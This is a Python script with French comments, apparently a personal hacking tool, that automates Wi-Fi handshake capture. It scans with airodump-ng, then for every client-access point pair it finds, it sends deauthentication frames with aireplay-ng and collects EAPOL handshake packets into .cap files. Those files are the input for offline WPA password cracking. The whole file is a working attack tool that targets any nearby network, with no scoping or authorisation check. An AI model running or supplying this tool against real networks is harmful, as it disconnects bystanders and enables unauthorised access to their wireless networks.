# ###########
# LIBRARIES #
#############

import csv
import time
import os
import subprocess
from colorama import Fore, Style, init
from threading import Thread, Event
from prettytable import PrettyTable
from scapy.all import rdpcap, EAPOL
import signal



##################################################-A-R-T-######################################################

# Initialisation de colorama
init(autoreset=True)

# Fonction pour mettre une ligne par couleur
def colored_text(text, color):
    return f"{color}{text}{Style.RESET_ALL}"

# ASCII art text
ascii_art = """
  _______ _______ _______ _______ _______ _______ _______ _______ ___ ___      _____    _______ 
 |   _   |   _   |   _   |   _   |   _   |   _   |   _   |   _   |   Y   )    | _   |  |   _   |
 |   1___|.  1___|.  1   |.  1   |.  1___|.  l   |.  1   |.  1___|.  1  /     |.|   |__|.  |   |
 |____   |.  |___|.  _   |.  ____|.  |___|.  _   |.  _   |.  |___|.  _  \     `-|.  |__|.  |   |
 |:  1   |:  1   |:  |   |:  |   |:  1   |:  |   |:  |   |:  1   |:  |   \      |:  |  |:  1   |
 |::.. . |::.. . |::.|:. |::.|   |::.. . |::.|:. |::.|:. |::.. . |::.| .  )     |::.|  |::.. . |
 `-------`-------`--- ---`---'   `-------`--- ---`--- ---`-------`--- ---'      `---'  `-------'    
 
                                         Made by LaFleur17
                                                                                            
"""                                                                              
                                                                                
                                                                                
# Choix de la couleur
color = Fore.LIGHTRED_EX

# Art en ligne par ligne 
lines = ascii_art.split("\n")

# Art ASCII coloré
for line in lines:
    if line:
        print(colored_text(line, color).ljust(70))   
time.sleep(7)


#################################################################################################################

def start_airodump():
    airodump_command = 'gnome-terminal -- sudo airodump-ng -w testy --output-format csv wlan0mon'
    subprocess.Popen(airodump_command, shell=True, preexec_fn=os.setsid)

def read_csv(csv_file):
    aps = []
    stations = []

    try:
        with open(csv_file, 'r') as file:
            reader = csv.reader(file)
            section = None

            for row in reader:
                if not row:
                    continue

                if row[0].startswith('Station MAC'):
                    section = 'Station'
                    continue
                elif row[0].startswith('BSSID'):
                    section = 'AP'
                    continue

                if section == 'AP':
                    aps.append({
                        'BSSID': row[0].strip(),
                        'ESSID': row[13].strip(),
                        'Channel': row[3].strip(),
                        'PWR': row[8].strip()
                    })
                elif section == 'Station':
                    stations.append({
                        'Station MAC': row[0].strip(),
                        'BSSID': row[5].strip()
                    })

        return aps, stations

    except FileNotFoundError:
        print("Le fichier CSV spécifié n'a pas été trouvé.")
        return [], []

def identify_connections(aps, stations):
    connections = []

    for station in stations:
        for ap in aps:
            if station['BSSID'] == ap['BSSID']:
                connections.append({
                    'Station MAC': station['Station MAC'],
                    'AP BSSID': ap['BSSID'],
                    'ESSID': ap['ESSID'],
                    'Channel': ap['Channel'],
                    'PWR': ap['PWR']
                })

    return connections

def display_table(connections):
    table = PrettyTable(['Numéro', 'Station MAC', 'AP BSSID', 'ESSID', 'Channel', 'PWR'])
    for i, connection in enumerate(connections):
        table.add_row([
            i+1,
            connection['Station MAC'],
            connection['AP BSSID'],
            connection['ESSID'],
            connection['Channel'],
            connection['PWR']
        ])
    os.system('cls' if os.name == 'nt' else 'clear')  # Effacer l'écran
    print(table)
    print("Attaque en cours...")

def update_table(csv_file):
    while not stop_event.is_set():
        print(f"Lecture du fichier CSV à {time.strftime('%Y-%m-%d %H:%M:%S')}")
        aps, stations = read_csv(csv_file)
        connections = identify_connections(aps, stations)

        display_table(connections)

        if not connections:
            print("Aucune connexion trouvée entre les stations et les APs.")

        time.sleep(5)  # Attendre 5 secondes avant la prochaine mise à jour du tableau

def analyze_cap_file(cap_file_name, connections):
    try:
        packets = rdpcap(cap_file_name)
        eapol_count = 0
        for packet in packets:
            if packet.haslayer(EAPOL):
                eapol_count += 1
                connection = next((c for c in connections if c['AP BSSID'] == packet.addr2), None)
                if connection:
                    print(f"Paquet EAPOL trouvé pour l'AP BSSID {connection['AP BSSID']}")
                    break
        if eapol_count > 0:
            print(f"{eapol_count} paquets EAPOL trouvés dans le fichier {cap_file_name}")
        else:
            print(f"Aucun paquet EAPOL trouvé dans le fichier {cap_file_name}")
    except FileNotFoundError:
        print(f"Le fichier {cap_file_name} n'a pas été trouvé.")
    except Exception as e:
        print(f"Une erreur s'est produite lors de l'analyse du fichier .cap : {e}")

def analyze_all_cap_files():
    while not stop_event.is_set():
        cap_folder = 'cap_files'
        cap_files = [f for f in os.listdir(cap_folder) if f.endswith('.cap')]

        connections = []  # Vous pouvez passer les connexions ici si nécessaire
        for cap_file in cap_files:
            analyze_cap_file(os.path.join(cap_folder, cap_file), connections)

        print(f"Analyse de tous les fichiers .cap terminée à {time.strftime('%Y-%m-%d %H:%M:%S')}")
        time.sleep(30)  # Analyser périodiquement toutes les 30 secondes

def attack_station(ap_bssid, station_mac, channel, connections):
    try:
        cap_folder = 'cap_files'
        os.makedirs(cap_folder, exist_ok=True)

        cap_file_name = os.path.join(cap_folder, f'capture_{ap_bssid}')
        airodump_command = f'gnome-terminal -- airodump-ng --bssid {ap_bssid} -c {channel} -w {cap_file_name} --output-format cap wlan1'
        airodump_process = subprocess.Popen(airodump_command, shell=True, preexec_fn=os.setsid)

        # Ajouter un processus pour tuer airodump-ng après 60 secondes
        kill_airodump_command = f'sleep 60 && pkill -f "airodump-ng --bssid {ap_bssid}"'
        kill_airodump_process = subprocess.Popen(kill_airodump_command, shell=True)

        time.sleep(10)

        aireplay_command = f'gnome-terminal -- aireplay-ng --deauth 20 -a {ap_bssid} -c {station_mac} wlan1'
        subprocess.run(aireplay_command, shell=True)

        time.sleep(50)

        os.killpg(os.getpgid(airodump_process.pid), signal.SIGTERM)
        airodump_process.wait()

        analyze_cap_file(f'{cap_file_name}-01.cap', connections)

    except subprocess.TimeoutExpired:
        print("La capture a échoué. Veuillez réessayer.")
    except Exception as e:
        print(f"Une erreur s'est produite : {e}")
        

##################################################-M-A-I-N-######################################################

def main():
    # Démarrer airodump-ng pour générer le fichier CSV
    print("Lancement d'airodump-ng")
    start_airodump()
    
    csv_file = 'testy-01.csv'  # Le fichier CSV généré par airodump-ng
    print("Fichier CSV généré : ", csv_file)

    global stop_event
    stop_event = Event()

    update_thread = Thread(target=update_table, args=(csv_file,))
    update_thread.daemon = True
    update_thread.start()

    analyze_thread = Thread(target=analyze_all_cap_files)
    analyze_thread.daemon = True
    analyze_thread.start()

    try:
        while True:
            aps, stations = read_csv(csv_file)

            if not aps and not stations:
                print("Aucune donnée trouvée dans le fichier CSV.")
                time.sleep(5)
                continue

            connections = identify_connections(aps, stations)

            if not connections:
                print("Aucune connexion trouvée entre les stations et les APs.")
                time.sleep(5)
                continue

            display_table(connections)
            print("Tableau affiché")

            for connection in connections:
                print(f"Lancement de l'attaque sur {connection['AP BSSID']}...")
                attack_station(connection['AP BSSID'], connection['Station MAC'], connection['Channel'], connections)
                time.sleep(5)  # Attendre 5 secondes avant de passer à la prochaine attaque

    except KeyboardInterrupt:
        stop_event.set()  # Arrêter les threads lorsqu'une interruption clavier est détectée

if __name__ == "__main__":
    main()
